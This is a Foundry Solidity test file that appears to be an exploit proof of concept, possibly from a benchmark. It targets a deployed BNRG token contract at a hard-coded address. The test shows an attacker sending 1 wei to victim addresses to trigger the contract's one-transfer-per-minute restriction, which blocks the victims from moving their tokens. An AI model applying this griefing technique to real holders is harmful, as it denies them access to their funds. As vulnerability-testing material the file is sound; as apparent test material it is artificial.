// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IBNRG {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function owner() external view returns (address);
    function setBotProtection(bool enable) external;
    function state() external view returns (uint8);
    function mint(uint256 numTokens) external returns(bool);
    function burn(uint256 numTokens) external returns(bool);
    function setRestrictionAmount(uint256 amount) external;
    function blacklistAccount(address account, bool ban) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C;
    address attacker = address(this);
    IBNRG bnrgtoken;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Create interface for BNRG
        bnrgtoken = IBNRG(TARGET);

        // Get owner address
        address owner = bnrgtoken.owner();

        // Impersonate owner to enable bot protection
        vm.startPrank(owner);
        bnrgtoken.setBotProtection(true);
        vm.stopPrank();

        // Verify contract is in Restricted state
        assertEq(uint256(bnrgtoken.state()), 1); // 0=Locked, 1=Restricted, 2=Unlocked

        // Give attacker some BNRG tokens
        // We need to manipulate the balance mapping directly since there's no mint function for non-owner
        // The owner has all tokens initially, so we'll transfer from owner to attacker
        vm.prank(owner);
        bnrgtoken.transfer(attacker, 1000 * 10**18);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get owner address
        address owner = bnrgtoken.owner();

        // Create victim addresses
        address victim1 = makeAddr("victim1");
        address victim2 = makeAddr("victim2");
        address victim3 = makeAddr("victim3");

        // Transfer 1 wei to each victim to set their lastTx
        bnrgtoken.transfer(victim1, 1);
        bnrgtoken.transfer(victim2, 1);
        bnrgtoken.transfer(victim3, 1);

        // Now victims should be locked out for 60 seconds
        // Try to make a transfer from victim1 (should revert)
        // First give victim1 some tokens to transfer
        vm.prank(owner);
        bnrgtoken.transfer(victim1, 100 * 10**18);

        // Now try to transfer from victim1 - should revert due to lastTx check
        vm.prank(victim1);
        vm.expectRevert("BMON: only one tx/min in restricted mode");
        bnrgtoken.transfer(victim2, 1);

        // Also verify attacker's lastTx[attacker] > 0 as per oracle requirement
        // We can check this by trying to make another transfer from attacker immediately
        // It should also revert
        vm.expectRevert("BMON: only one tx/min in restricted mode");
        bnrgtoken.transfer(victim1, 1);
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
